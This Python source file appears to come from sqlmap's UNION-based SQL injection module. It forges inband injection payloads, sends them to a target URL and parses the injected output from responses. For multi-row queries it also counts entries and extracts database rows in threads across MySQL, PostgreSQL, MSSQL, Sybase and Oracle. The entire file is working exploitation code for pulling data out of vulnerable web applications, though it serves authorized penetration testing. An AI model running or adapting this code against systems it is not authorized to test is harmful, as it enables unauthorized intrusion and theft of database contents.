#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import threading
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import filterStringValue
from lib.core.common import getConsoleWidth
from lib.core.common import getUnicode
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import parseUnionPage
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeWarnMessage
from lib.core.convert import safecharencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapSyntaxException
from lib.core.settings import FROM_TABLE
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

reqCount = 0

def __oneShotUnionUse(expression, unpack=True):
    global reqCount

    check = "(?P<result>%s.*%s)" % (kb.misc.start, kb.misc.stop)
    trimcheck = "%s(?P<result>.*?)</" % (kb.misc.start)

    # Prepare expression with delimiters
    expression = agent.concatQuery(expression, unpack)
    expression = unescaper.unescape(expression)

    if conf.limitStart or conf.limitStop:
        where = PAYLOAD.WHERE.NEGATIVE
    else:
        where = None

    # Forge the inband SQL injection request
    vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
    query = agent.forgeInbandQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5])
    payload = agent.payload(newValue=query, where=where)

    # Perform the request
    page, headers = Request.queryPage(payload, content=True, raise404=False)

    reqCount += 1

    # Parse the returned page to get the exact union-based
    # sql injection output
    output = reduce(lambda x, y: x if x is not None else y, [ \
            extractRegexResult(check, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
            extractRegexResult(check, removeReflectiveValues(listToStrValue(headers.headers \
            if headers else None), payload, True), re.DOTALL | re.IGNORECASE)], \
            None)

    if output is not None:
        output = getUnicode(output, kb.pageEncoding)
    else:
        trimmed = extractRegexResult(trimcheck, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(trimcheck, removeReflectiveValues(listToStrValue(headers.headers \
                if headers else None), payload, True), re.DOTALL | re.IGNORECASE)

        if trimmed:
            warnMsg = "possible server trimmed output detected (due to its length): "
            warnMsg += trimmed
            logger.warn(warnMsg)
        elif Backend.isDbms(DBMS.MYSQL) and not kb.multiThreadMode:
            warnMsg = "if the problem persists with 'None' values please try to use "
            warnMsg += "hidden switch --no-cast (fixing problems with some collation "
            warnMsg += "issues)"
            singleTimeWarnMessage(warnMsg)

    return output

def configUnion(char=None, columns=None):
    def __configUnionChar(char):
        if not isinstance(char, basestring):
            return

        kb.uChar = char

        if conf.uChar is not None:
            kb.uChar = char.replace("[CHAR]", conf.uChar if conf.uChar.isdigit() else "'%s'" % conf.uChar.strip("'"))

    def __configUnionCols(columns):
        if not isinstance(columns, basestring):
            return

        columns = columns.replace(" ", "")
        if "-" in columns:
            colsStart, colsStop = columns.split("-")
        else:
            colsStart, colsStop = columns, columns

        if not colsStart.isdigit() or not colsStop.isdigit():
            raise sqlmapSyntaxException, "--union-cols must be a range of integers"

        conf.uColsStart = int(colsStart)
        conf.uColsStop = int(colsStop)

        if conf.uColsStart > conf.uColsStop:
            errMsg = "--union-cols range has to be from lower to "
            errMsg += "higher number of columns"
            raise sqlmapSyntaxException, errMsg

    __configUnionChar(char)
    __configUnionCols(conf.uCols or columns)

def unionUse(expression, unpack=True, dump=False):
    """
    This function tests for an inband SQL injection on the target
    url then call its subsidiary function to effectively perform an
    inband SQL injection on the affected url
    """

    initTechnique(PAYLOAD.TECHNIQUE.UNION)

    global reqCount

    count = None
    origExpr = expression
    startLimit = 0
    stopLimit = None
    test = True
    value = ""
    reqCount = 0
    width = getConsoleWidth()
    start = time.time()

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or \
       (dump and (conf.limitStart or conf.limitStop))) and \
       " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
       not in FROM_TABLE) or (Backend.getIdentifiedDbms() in FROM_TABLE \
       and not expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, "COUNT(*)", 1)

            if re.search(" ORDER BY ", expression, re.I):
                untilOrderChar = countedExpression.index(" ORDER BY ")
                countedExpression = countedExpression[:untilOrderChar]

            count = resume(countedExpression, None)
            count = parseUnionPage(count, countedExpression)

            if not count or not count.isdigit():
                output = __oneShotUnionUse(countedExpression, unpack)

                if output:
                    count = parseUnionPage(output, countedExpression)

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            else:
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the used SQL query. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            try:
                threadData = getCurrentThreadData()
                numThreads = min(conf.threads, stopLimit-startLimit)
                threadData.shared.limits = range(startLimit, stopLimit)
                threadData.shared.value = ""

                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                    kb.suppressResumeInfo = True
                    infoMsg = "suppressing possible resume console info because of "
                    infoMsg += "large number of rows (might take too much time)"
                    logger.info(infoMsg)

                lockNames = ('limits', 'value')
                for lock in lockNames:
                    kb.locks[lock] = threading.Lock()

                def unionThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        kb.locks.limits.acquire()
                        if threadData.shared.limits:
                            num = threadData.shared.limits[-1]
                            del threadData.shared.limits[-1]
                            kb.locks.limits.release()
                        else:
                            kb.locks.limits.release()
                            break

                        if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                            field = expressionFieldsList[0]
                        elif Backend.isDbms(DBMS.ORACLE):
                            field = expressionFieldsList
                        else:
                            field = None

                        limitedExpr = agent.limitQuery(num, expression, field)
                        output = resume(limitedExpr, None)

                        if not output:
                            output = __oneShotUnionUse(limitedExpr, unpack)

                        if not kb.threadContinue:
                            break

                        if output:
                            kb.locks.value.acquire()
                            threadData.shared.value += output
                            kb.locks.value.release()

                            if conf.verbose == 1:
                                if all(map(lambda x: x in output, [kb.misc.start, kb.misc.stop])):
                                    items = extractRegexResult(r'%s(?P<result>.*?)%s' % (kb.misc.start, kb.misc.stop), output, re.DOTALL | re.IGNORECASE).split(kb.misc.delimiter)
                                else:
                                    items = output.replace(kb.misc.start, "").replace(kb.misc.stop, "").split(kb.misc.delimiter)

                                status = "[%s] [INFO] retrieved: %s\r\n" % (time.strftime("%X"), safecharencode(",".join(map(lambda x: "\"%s\"" % x, items))))

                                if len(status) > width:
                                    status = "%s..." % status[:width - 3]

                                kb.locks.ioLock.acquire()
                                dataToStdout(status, True)
                                kb.locks.ioLock.release()

                runThreads(numThreads, unionThread)

                if conf.verbose == 1:
                    clearConsoleLine(True)

            except KeyboardInterrupt:
                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            except sqlmapConnectionException, e:
                errMsg = "connection exception detected. sqlmap "
                errMsg += "will display partial output"
                errMsg += "'%s'" % e
                logger.critical(errMsg)

            finally:
                value = threadData.shared.value
                kb.suppressResumeInfo = False

    if not value:
        value = __oneShotUnionUse(expression, unpack)

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
        logger.debug(debugMsg)

    return value
